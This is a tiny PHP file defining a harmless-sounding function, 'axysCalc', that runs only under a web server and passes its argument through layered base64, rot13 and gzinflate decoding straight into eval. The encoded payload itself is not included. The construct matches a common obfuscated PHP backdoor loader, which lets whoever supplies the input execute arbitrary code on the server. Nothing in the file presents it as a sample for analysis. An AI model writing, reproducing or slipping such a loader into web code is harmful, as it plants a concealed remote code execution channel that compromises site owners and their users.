<?php

function axysCalc($axys)
{
  if (php_sapi_name() !== 'cli') {
    eval(str_rot13(
      gzinflate(
        str_rot13(
          base64_decode(
            $axys
          )
        )
      )
    ));
  }
}
